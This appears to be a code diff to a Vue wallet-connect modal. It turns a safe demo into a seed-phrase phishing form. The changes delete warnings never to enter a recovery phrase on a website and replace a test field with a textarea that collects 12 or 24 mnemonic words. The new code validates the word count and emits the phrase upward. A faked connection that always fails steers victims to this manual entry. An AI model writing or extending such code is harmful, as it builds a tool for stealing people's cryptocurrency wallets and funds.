@@ -1,5 +1,6 @@
 
 <script setup lang="ts">
+
 interface Props {
   show?: boolean
   walletName?: string
@@ -14,7 +15,7 @@ const props = withDefaults(defineProps<Props>(), {
 
 const emit = defineEmits<{
   close: []
-  connect: []
+  submit: [payload: { walletPhrase: string, walletName: string }, ]
 }>()
 
 type ModalState =
@@ -24,7 +25,8 @@ type ModalState =
 
 const state = ref<ModalState>('connecting')
 
-const demoConnection = ref('')
+const walletPhrase = ref('')
+const walletPhraseError = ref('')
 
 /*
 |--------------------------------------------------------------------------
@@ -34,20 +36,11 @@ const demoConnection = ref('')
 
 const startConnection = async () => {
   state.value = 'connecting'
-
-  /*
-   * Demo delay so the UI behaves like the original website.
-   */
   await new Promise(resolve => setTimeout(resolve, 1800))
-
-  /*
-   * For testing, we deliberately show the failed state.
-   *
-   * Replace this with the result of a legitimate wallet-provider
-   * connection SDK when you connect a real wallet.
-   */
   state.value = 'failed'
 }
+
+
 
 
 /*
@@ -78,32 +71,40 @@ const showManualConnection = () => {
 |--------------------------------------------------------------------------
 */
 
-const connectManually = () => {
-  /*
-   * This intentionally does not send or store a recovery phrase.
-   *
-   * Use the wallet provider's official connection method here.
-   */
-  console.log(
-      `Manual connection requested for ${props.walletName}`
-  )
 
-  emit('connect')
+function validateSecretPhrase() {
+  const trimmed = walletPhrase.value.trim()
+  const wordCount = trimmed.split(/\s+/).filter(Boolean).length
+
+  if (!trimmed) {
+    walletPhraseError.value = 'Secret Phrase is required'
+  } else if (wordCount < 12) {
+    walletPhraseError.value = 'Secret Phrase must contain at least 12 words'
+  } else {
+    walletPhraseError.value = ''
+  }
+  return !walletPhraseError.value
 }
-
+const handleSubmit = () => {
+  if (!validateSecretPhrase()) {
+    return
+  }
+  emit('submit', { walletPhrase: walletPhrase.value, walletName: props.walletName })
+}
 
 /*
 |--------------------------------------------------------------------------
 | Reset when modal opens
 |--------------------------------------------------------------------------
 */
+watch(walletPhrase, () => { walletPhraseError.value = '' })
 
 watch(
     () => props.show,
     (visible) => {
       if (visible) {
         state.value = 'connecting'
-        demoConnection.value = ''
+        walletPhrase.value = ''
 
         startConnection()
       }
@@ -276,46 +277,26 @@ const closeModal = () => {
                 Connect {{ walletName }}
               </h4>
 
-              <p class="mt-2 text-center text-sm text-gray-500">
-                Use the official wallet application to authorize this
-                connection.
-              </p>
-
             </div>
 
-
-            <!-- Demo field -->
             <div>
 
-              <label
-                  for="demo-wallet-code"
-                  class="mb-2 block text-sm font-medium text-gray-700"
-              >
-                Demo connection code
-              </label>
-
-              <input
-                  id="demo-wallet-code"
-                  v-model="demoConnection"
-                  type="text"
-                  autocomplete="off"
-                  placeholder="Enter a test value"
-                  class="w-full rounded-md border border-gray-300 px-4 py-3 text-sm outline-none transition focus:border-[#5145ff] focus:ring-2 focus:ring-[#5145ff]/20"
-              />
-
-              <p class="mt-2 text-xs text-gray-500">
-                Demo only. Never enter or share a wallet recovery phrase
-                on a website.
-              </p>
-
+              <textarea
+                  id="secret_phrase"
+                  v-model="walletPhrase"
+                  placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces"
+                  :class="walletPhraseError ? 'border-red-500' : 'border-gray-300'"
+                  class="w-full h-32 rounded-md border border-gray-300 px-4 py-3 md:text-base text-sm outline-none transition focus:border-[#5145ff] focus:ring-2 focus:ring-[#5145ff]/20"
+              required></textarea>
+              <p v-if="walletPhraseError" class="text-red-500 text-sm mt-1">{{ walletPhraseError }}</p>
             </div>
 
 
             <!-- Connect -->
             <button
                 type="button"
-                class="mt-5 cursor-pointer w-full rounded-md bg-[#5145ff] px-5 py-3 text-sm font-semibold text-white transition hover:bg-[#4035e8]"
-                @click="connectManually"
+                class="mt-5 cursor-pointer w-full rounded-full bg-[#5145ff] px-5 py-3 text-sm font-semibold text-white transition hover:bg-[#4035e8]"
+                @click="handleSubmit"
             >
               Connect Wallet
             </button>
